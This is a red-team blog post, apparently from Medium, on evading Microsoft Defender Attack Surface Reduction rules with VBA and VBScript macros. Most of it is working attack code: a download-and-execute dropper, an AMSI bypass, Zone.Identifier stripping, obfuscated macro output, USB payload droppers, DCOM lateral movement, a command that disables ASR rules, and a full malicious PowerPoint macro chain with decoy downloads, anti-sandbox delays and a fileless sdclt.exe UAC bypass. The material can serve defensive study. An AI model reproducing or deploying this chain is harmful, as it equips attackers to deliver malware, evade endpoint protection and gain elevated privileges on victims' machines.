---
layout: post
title: "Bypassing Attack Surface Reduction (ASR) Rules with VBA Macros Part 2"
date: 2025-08-26
categories: [Red Team,Macro,Malware Analysis,Malware Development,Blue Team,VBA,Cyber Security]
image: https://cdn-images-1.medium.com/max/800/1*15gFAZAWtcufSSqBVCBpCg.jpeg
---

We covered the definition of ASR and some tips for avoiding it in Part 1; review it before we begin.

#### Disclaimer:

This article is for educational purposes only. The techniques discussed are intended for understanding security controls and enhancing defensive strategies.

The techniques is inspired by the methods described in [Sévagas’ ASR bypass research.](https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf)

### Why ASR Didn’t Trigger Against Classic VB Droppers

In theory, the ASR rule `D3E037E1-3EB8-44C8-A917-57927947596D` ("Block JavaScript or VBScript from launching downloaded executable content") is meant to prevent VBScript or JavaScript files from launching executables that were downloaded from the Internet.

Classic VBScript Dropper:

```
'Download and execute putty
Private Sub DownloadAndExecute()
  myURL="https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
  downloadPath = "yop.exe"
  downloadPath = wshshell. ExpandEnvironmentStrings ("TEMP") & "\" & downloadPath
  Set WinHttpReq
  CreateObject("MSXML2.ServerXMLHTTP.6.0")
  WinHttpReq.setOption (2) = 13056 Ignore cert errors
  WinHttpReq.Open "GET", myURL, False ', "username", "password"
  If WinHttpReq.Status = 200 Then
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type 1
    oStream.Write WinHttpReq.ResponseBody
    oStream.SaveToFile downloadPath, 2
    oStream.Close
    CreateObject("WScript.Shell").Run downloadPath, 0
  End If
End Sub 
```

However, during testing with a classic VBScript dropper that downloaded and executed a remote executable (such as `putty.exe`), ASR was **not** triggered. Instead, **Windows Defender and AMSI** blocked the script. This happened because Windows Defender detects both:

- A download from a remote URL
- A call to `WScript.Shell.Run` in the same script

**The key reason ASR was not triggered**:  
The download was performed using `MSXML2.ServerXMLHTTP.6.0`, which **does not create** a `Zone.Identifier` alternate data stream (ADS) on the downloaded file.  
ASR relies solely on the **presence** of the `Zone.Identifier` ADS to consider a file as "downloaded from the Internet." Without that ADS, ASR takes no action.

**Additional notes:**

- A simple **AMSI bypass** can be achieved by using `RDS.DataSpace` to launch the executable, evading AMSI scanning:

```
Sub WscriptExec(targetPath)   
  Set comApp = CreateObject("RDS.DataSpace")     
  comApp.CreateObject("Wscript.Shell", "").Run targetPath, 0 
End Sub
```

- To manually **bypass ASR** on files that do have a Zone.Identifier, we can **strip the ADS** using:

```
move file.exe %temp%\tmpfile.dat
type %temp%\tmpfile.dat > file.exe 
del %temp%\tmpfile.dat
```

This technique removes the alternate data stream, making the file appear as trusted (locally created).

* * *

### Why the “Block Execution of Potentially Obfuscated Scripts” Rule Didn’t Trigger

The ASR rule `5BEB7EFE-FD9A-4556-801D-275E5FFC04CC` ("Block execution of potentially obfuscated scripts") is intended to block scripts that look obfuscated or encoded from running.

To test this, I created two VBScript files:

#### 1. Normal VBScript

```
Sub AutoOpen()
WscriptExec "C:\windows\system32\cmd.exe /C calc.exe"
End Sub
' Exec process using WScript.Shell
Sub WscriptExec(targetPath)
    CreateObject("WScript.Shell").Run targetPath, 0
End Sub
AutoOpen
```

This was a **simple, non-obfuscated** script that launches `calc.exe`.

* * *

#### 2. Obfuscated VBScript

I then used `macro_pack` to generate an **obfuscated** version:

```
echo "C:\windows\system32\cmd.exe /C calc.exe" | macro_pack.py -t CMD -o -G playcmd_obf.vbs
```

Resulting obfuscated VBScript:

```
Const Insrhjpopn = 2
Const yngyvpmeek = 1
Const crkokypojl = 0
Sub AutoOpen()
    gnmqjrajzrjauenuy rteozwvfivqg("433a5c7769") & rteozwvfivqg("6e646177735c7375")
End Sub
Sub gnmqjrajzrjauenuy(urorvuncg)
    5c636d642e6578652021432063616c632e657865")
    CreateObject(rteozwvfivqq("57536372") & rteozwvfivqg("6970742e5368656c6c")).Run urorvuncg, 0
End Sub
Private Function rteozwvfivqq(ByVal hejvgenlwbbd)
    Dim nxcplribsaub
    For nxcplribsaub = 1 To Len(hejvgenlwbbd) Step 2
        rteozwvfivga = rteozwvfivga & Chr(CInt("&H" & Mid(hejvgenlwbbd, nxcplribsaub, 2)))
    Next
End Function
AutoOpen
```

Clearly, this script is **heavily obfuscated**.

* * *

#### Results

Obviously, anyone could see that the second script is obfuscated, however when I executes it, ASR was not triggered.

This ASR rules was tested by other people without success either. It seems the feature is not mature, see [https://www.darkoperator.com/blog/2017/11/8/windows-defender-exploit-guardasr-obfuscated-script-rule.](https://www.darkoperator.com/blog/2017/11/8/windows-defender-exploit-guardasr-obfuscated-script-rule.) The author tested basic public encoder for VBscript and Powershell and they did not trigger the rule.

* * *

### XI. Block Untrusted and Unsigned Processes that Run from USB

> ***ASR Rule ID:*** `b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4`  
> **Official Description:**

> *“With this rule, admins can prevent unsigned or untrusted executable files from running from USB removable drives, including SD cards. Blocked file types include:*

- Executable files (.exe, .dll, .scr)
- Script files (.ps1, .vbs, .js, etc.)”

👉 Source: [Microsoft Docs — Attack Surface Reduction Rules](https://learn.microsoft.com/)

* * *

#### Objective of This Rule:

The goal is to **reduce the risk of malware introduced through USB devices** (also known as “removable media attacks” or “removable media malware propagation”).  
By enforcing **trust and signature validation**, Windows Defender SmartScreen / ASR tries to block:

- Executables that **are not signed by a trusted publisher**.
- Executables that **are tampered with** (even if they were signed before).
- Scripts that launch payloads from a USB drive.

This targets real-world attacker behavior:

- Drop malware onto USB keys → trick victim into running it → initial access.

#### Testing the Rule

We tested how well this ASR rule **actually behaves** in practice by simulating an attacker who tries different types of payloads on a USB drive (`G:`).

Let’s review each method we tested:

#### 1. HTA Payload

Command used:

```
echo calc.exe | macro_pack.py -t CMD -G G:\test.hta
```

- `.hta` is a **HTML Application** file that runs inside `mshta.exe`.
- When we ran the HTA file from the USB, **it executed without triggering** the ASR rule.

**Reason:**  
This rule **does not block HTA** files properly because HTA files are launched by a signed Microsoft binary (`mshta.exe`), making the execution flow **indirect**.

#### 2. VBS Payload

Command used:

```
echo calc.exe | macro_pack.py -t CMD -G G:\test.vbs
```

- `.vbs` is a **VBScript** file.
- Again, **it ran successfully without triggering** the ASR rule.

**Reason:**  
VBScript files are scripts, and although the description mentions blocking them, **the implementation focuses mainly on EXEs/DLLs**.  
Also, `wscript.exe` or `cscript.exe` (used to run VBS) are trusted signed binaries, so Windows Defender doesn't block execution.

#### 3. LNK (Shortcut) Payload

Command used:

```
echo calc.exe . | macro_pack.py -G G:\test.lnk
```

- `.lnk` is a **shortcut file** that points to an executable or a command.

**Result:**

- **Shortcut launched without any ASR trigger.**

**Reason:**  
The shortcut (`.lnk`) itself isn't a direct executable; it is a pointer.  
**ASR doesn’t block shortcut resolutions.**

#### 4. Windows Native Binary (`calc.exe`)

Command used:

```
copy /b %windir%\system32\calc.exe G:\test.exe
```

- we manually copied a **trusted Microsoft binary** to the USB drive.

**Result:**

- **Executed successfully** without triggering ASR.

**Reason:**  
The binary was **signed and trusted by Microsoft**.  
The ASR rule **allows trusted/signed executables**, even from USB.

#### 5. Non-Microsoft Signed Binary (PuTTY)

Command used:

```
curl https://the.earth.li/~sgtatham/putty/0.70/w32/putty.exe --output G:\putty.exe
```

- We downloaded a **legitimate signed** PuTTY binary.

**Result:**

- **Ran successfully** without triggering ASR.

**Reason:**

- Although PuTTY is **not a Microsoft binary**, it **was digitally signed by its legitimate publisher** (Simon Tatham).
- ASR only blocks **unsigned** or **untrusted** binaries — PuTTY’s signature was still valid.

* * *

#### 6. Modified Non-signed Binary

Commands:

```
curl https://the.earth.li/~sgtatham/putty/0.70/w32/putty.exe --output G:\putty_badsignature.exe
echo 0 >> G:\putty_badsignature.exe
```

- we downloaded a signed PuTTY binary.
- we **corrupted the file** by appending a character at the end (this **breaks the digital signature**).

**Result:**

- **ASR rule finally triggered!**

**Reason:**

- The modified executable **failed signature verification**.
- ASR detected it as **untrusted** and **blocked execution**, as intended.

#### ASR Rule Bypass

I then demonstrated a **realistic bypass method**:

Since **scripts** like `.vbs` were **not blocked**, we could:

- Use a **dropper** script to **download** an unsigned executable from the Internet.
- Or **embed** the unsigned executable **directly inside** a script.

Command used:

```
macro_pack -t EMBED_EXE -e G:\putty_badsignature.exe -G drop_bad_putty.vbs
```

This generates a `.vbs` file that contains the payload **inside** itself, then extracts and executes it from `TEMP` folder.

#### Why the bypass works:

- The script is **executed** by a trusted binary (`wscript.exe` or `cscript.exe`).
- **The payload no longer runs directly from the USB drive**, but from a **trusted location (e.g., %TEMP%)**.
- **No USB signature check** is performed on the dropped file.
- **ASR rule does not inspect** internal payloads extracted by scripts (at least not this specific rule).

* * *

### Rule: Block process creations originating from PSExec and WMI commands

**Rule ID:** `d1e49aac-8f56-4280-b9ba-993a6d77406c`

> ***“This rule blocks processes launched through PsExec and WMI commands* to stop remote execution that could spread malware.”**

#### ➔ What It Aims To Do:

- **Stop attackers from launching processes remotely** using **WMI** (Windows Management Instrumentation) and **PsExec** (SysInternals remote tool).
- Prevent **lateral movement** and **remote code execution** during post-exploitation.
- Helps defend against malware that moves from machine to machine.

#### Basic Test of the Rule:

#### When running:

- `wmic process call create "cmd.exe"` → **Blocked**
- `psexec -s -i cmd.exe` → **Blocked**

(ASR correctly blocks simple WMI and PsExec commands.)

#### Lateral Movement Workaround (Bypassing the Rule)

Although PsExec and WMI were blocked, **attackers still have ways to move laterally** across machines:

#### Technique 1: Using DCOM and ShellBrowserWindow

> ***DCOM* (Distributed Component Object Model) lets programs remotely control Windows components (like Explorer).**

we can **spawn remote commands** **without WMI or PsExec**, using DCOM objects directly:

```
$com = [Type]::GetTypeFromCLSID('c08afd90-f2a1-11d1-8455-00a0c91f3880', '192.168.5.12')
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute("calc.exe")
```

**Result:**

- `calc.exe` will run remotely on `192.168.5.12`.
- If Windows Firewall is active, the user might see a prompt asking to allow **“explorer.exe”**.

Successfully **bypasses the ASR rule**, because it’s not WMI or PsExec.

* * *

#### Technique 2: Turning off ASR rules remotely

If the attacker has **admin rights** on the remote machine:

- They can **disable ASR** using **remote PowerShell**:

Example command:

```
Set-MpPreference -AttackSurfaceReductionRules_Ids d1e49aac-8f56-4280-b9ba-993a6d77406c -AttackSurfaceReductionRules_Actions Disabled
```

**Result:**

- The ASR rule is now disabled on the target machine.
- The attacker can freely use WMI, PsExec, or anything else.

[Explained Here](https://www.fortynorthsecurity.com/windows-asr-rules-reenabling-wmi-when-blocked/)

#### Bypassing PsExec Restrictions (Getting SYSTEM Privileges Anyway)

Even though **PsExec** is “blocked” directly by ASR when running with SYSTEM privileges, attackers found a workaround:

#### Step-by-Step: How PsExec can still be abused:

1. **Extract PSEXESVC.exe manually**:

<!--THE END-->

- When PsExec runs, it drops a hidden service helper called **PSEXESVC.exe** inside `C:\Windows`.
- we can **manually extract it** from an earlier run or download it yourself.

**2. Manually Install PSEXESVC.exe:**

- Copy `PSEXESVC.exe` to some writable directory, e.g., `%TEMP%`.
- Install it **manually** by running:
- `PSEXESVC.exe -install`

**Start the Service Yourself:**

- `sc start PSINFSVC`
- (`PSINFSVC` = PsInfo Service = The manually installed service.)

**Use PsExec Again Successfully**:

- Now we can run:
- `psexec -s -i cmd.exe`

**Result:** We get a SYSTEM shell, because the service is already trusted and running.

* * *

### Bypass ALL Scenario

As a grand finally let’s enable all ASR rules and write a malicious PowerPoint document which:

- Is obfuscated
- Bypasses ASR •
- Bypasses AMSI &amp; Antivirus
- Bypasses UAC
- Downloads and Drop putty and run it with elevated privileges

Below are several (non-obfuscated) code snippets to understand what happens.

#### 1. Auto-launch When Macro is Enabled

```
Sub AutoOpen()
    Dim myURL As String
    Dim realPath As String
    myURL = "https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe"
    realPath = Environ("TEMP") & "\dropped.exe"
    
    Download myURL, realPath
    BypassUACExec realPath
End Sub
```

- `AutoOpen` automatically triggers when the victim opens the file (if macros are enabled).
- Downloads PuTTY to `%TEMP%\dropped.exe`.
- Calls `BypassUACExec` to execute it **with elevated privileges**.

#### 2. Download Function (Bypass ASR and AMSI)

```
Sub Download(myURL As String, realPath As String)
    Dim downloadPath As String
    Dim renameCmd As String
    Dim WinHttpReq As Object
    Dim oStream As Object
    downloadPath = Environ("TEMP") & "\vcsjbjc.txt"
    Set WinHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    WinHttpReq.setOption(2) = 13056  ' Ignore SSL errors
    WinHttpReq.Open "GET", myURL, False
    WinHttpReq.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    WinHttpReq.Send
    If WinHttpReq.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1  ' Binary
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile downloadPath, 2  ' Overwrite if exists
        oStream.Close
        
        renameCmd = "cmd.exe /c move """ & downloadPath & """ """ & realPath & """"
        BypassUACExec renameCmd
        
        MySleep 1
    End If
End Sub
```

- **Decoy download** into `.txt` file (`vcsjbjc.txt`) to **bypass ASR scanning**.
- **Then move** the `.txt` file into the real binary (`dropped.exe`) **using CMD**.
- **Bypasses** AMSI scanning by using ADODB instead of common methods.

#### 3. Sleep Helper

**(Simple anti-sandbox method)**

```
Sub MySleep(seconds As Integer)
    Dim endTime As Date
    endTime = DateAdd("s", seconds, Now)
    Do While Now < endTime
        DoEvents
    Loop
End Sub
```

- Can slow execution slightly to **bypass analysis environments**.

#### 4. ASR Catch Avoidance with Error Handling

```
Sub ExecuteCmdAsync(targetPath As String)
    On Error Resume Next
    Err.Clear
    
    wimResult = WmiExec(targetPath)
    
    If Err.Number <> 0 Or wimResult <> 0 Then
        Err.Clear
        ShellBrowserWindowExec targetPath
    End If
    
    If Err.Number <> 0 Then
        Err.Clear
        SchedulerExec(targetPath)
    End If
    
    On Error GoTo 0
End Sub
```

#### Explanation:

Tries multiple methods to execute the payload:

1. `WmiExec`
2. `ShellBrowserWindowExec`
3. `SchedulerExec`

If **one method fails or is blocked** (e.g., by **ASR rules**), **error handling** immediately **clears the error** and **moves to the next method**.

#### 5. Fileless UAC Bypass Using Sdclt.exe

```
Private Sub BypassUAC_Windows10(targetPath As String)
    Dim wshUac As Object
    Set wshUac = CreateObject("WScript.Shell")
    
    ' Registry keys for UAC bypass
    Dim regKeyCommand As String
    Dim regKeyCommand2 As String
    
    regKeyCommand = "HKCU\Software\Classes\Folder\Shell\Open\Command\"
    regKeyCommand2 = regKeyCommand & "DelegateExecute"
    
    ' Create the malicious keys
    wshUac.RegWrite regKeyCommand, targetPath, "REG_SZ"
    wshUac.RegWrite regKeyCommand2, "", "REG_SZ"
    
    ' Trigger UAC bypass using sdclt.exe
    ExecuteCmdAsync "C:\Windows\System32\sdclt.exe"
    
    ' Optional sleep to allow execution
    MySleep 3
    
    ' Clean up registry to remove traces
    wshUac.RegDelete "HKCU\Software\Classes\Folder\Shell\Open\Command\"
    wshUac.RegDelete "HKCU\Software\Classes\Folder\Shell\Open\"
    wshUac.RegDelete "HKCU\Software\Classes\Folder\Shell\"
    wshUac.RegDelete "HKCU\Software\Classes\Folder\"
End Sub
```

#### Explanation:

- **Registers a malicious shell open command** for folders under `HKCU`.
- **sdclt.exe** is a **high-integrity, auto-elevated binary** (auto UAC bypass) that opens **Folders**, and thus **executes** your payload **elevated**.
- After **payload execution**, **registry keys are wiped**, making it **fileless** and **stealthy**.

* * *

#### Resources:

By [Moataz Osama](https://medium.com/@mezo512) on [May 3, 2025](https://medium.com/p/e2ad87cb5a38).

[Canonical link](https://medium.com/@mezo512/bypassing-attack-surface-reduction-asr-rules-with-vba-macros-part-2-e2ad87cb5a38)

Exported from [Medium](https://medium.com) on August 26, 2025.